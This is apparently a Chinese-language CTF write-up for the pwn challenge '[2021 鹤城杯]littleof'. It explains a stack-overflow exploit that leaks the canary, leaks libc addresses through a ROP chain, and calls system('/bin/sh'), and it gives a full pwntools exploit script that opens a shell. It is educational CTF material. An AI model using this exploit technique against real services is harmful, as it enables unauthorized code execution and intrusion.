# [2021 鹤城杯]littleof_WP

> **平台**：NSSCTF
>
> **方向**：pwn
>
> **知识点**：栈溢出、栈对齐、ROP

## 一、信息获取

![image01](/pwn/[2021%20鹤城杯]littleof_WP/image/image01.png)

存在canary、NX、还有ASLR

## 二、分析

![image02](/pwn/[2021%20鹤城杯]littleof_WP/image/image02.png)

思路：1.泄露canary 2.由于开启了 NX 和 ASLR，而题目未提供 libc，需通过 ROP 泄露两个 libc 函数地址（如 puts 和 read），据此匹配对应 libc 版本，计算基址后调用 system(“/bin/sh”) 获取 shell。

### 泄露canary

函数中通过 __readfsqword(0x28) 将 canary 保存在栈上，可通过溢出后利用 printf(“%s”) 泄露。

### 泄露libc基地址

可利用puts函数打印相应函数got表里面的地址

![image03](/pwn/[2021%20鹤城杯]littleof_WP/image/image03.png)

pop rdi 控制参数

rop构建思路：将got地址出栈到rdi，再跳到puts plt，调用puts将地址泄露

### 栈对齐

![image04](/pwn/[2021%20鹤城杯]littleof_WP/image/image04.png)

利用ret进行栈对齐

## 三、EXP

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
elf = ELF('./littleof')
#io = process('./littleof')
io = remote(...)

#泄露canary
io.recvuntil(b"Do you know how to do buffer overflow?")
payload1 = b'A'*0x48+b'B'
io.send(payload1)
io.recvuntil(b"B")
leak = io.recvuntil(b". Try harder!")
canary = b'\x00'+leak[0:7]
log.success(f"canary = {hex(u64(canary))}")

pop_rdi = 0x400863
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']
main_addr = 0x04006E2
ret = 0x40059e

#泄露puts地址
payload2 = b'A'*0x48 + canary + b'B'*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
#put打印出puts_got里面的地址
io.send(payload2)
io.recvuntil(b'I hope you win\n')
leak = io.recvuntil(b'\n').strip()
leak = u64(leak.ljust(8, b'\x00'))
log.success(f"puts_addr = {hex(leak)}")

io.recvuntil(b"Do you know how to do buffer overflow?")
io.send(b'A')
io.recvuntil(b". Try harder!")

#泄露read地址
io.send(b'A'*0x48 
        + canary + b'B'*8 
        + p64(pop_rdi) 
        + p64(read_got) 
        + p64(puts_plt) 
        + p64(main_addr)
        )

io.recvuntil(b'I hope you win\n')
leak2 = io.recvuntil(b'\n').strip()
leak2 = u64(leak2.ljust(8, b'\x00'))
log.success(f"read_addr = {hex(leak2)}")

#匹配libc版本
puts_addr = leak
read_addr = leak2

result = libcdb.search_by_symbol_offsets(
    {"puts": puts_addr, "read": read_addr},
    select_index=0,
    offline_only=True,
    return_raw=True,
)

#地址计算
libc = result[0]
libc_symbols = {k: int(v, 16) for k, v in libc["symbols"].items()}
libc_base = puts_addr - libc_symbols["puts"]
system = libc_symbols["system"] + libc_base
binsh = libc_symbols["str_bin_sh"] + libc_base

#这里再泄露了一次canary
io.send(payload1)
io.recvuntil(b"B")
leak = io.recvuntil(b". Try harder!")
canary = b'\x00'+leak[0:7]
log.success(f"canary = {hex(u64(canary))}")

#最终payload
payload3 = b'A'*0x48 + canary + b'B'*8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
io.send(payload3)
io.interactive()
```

## 四、总结

我试的时候最后需要再泄露一次canary才成功

思路仅供参考，如有疑问或发现疏漏，欢迎各位师傅在评论区指正交流。
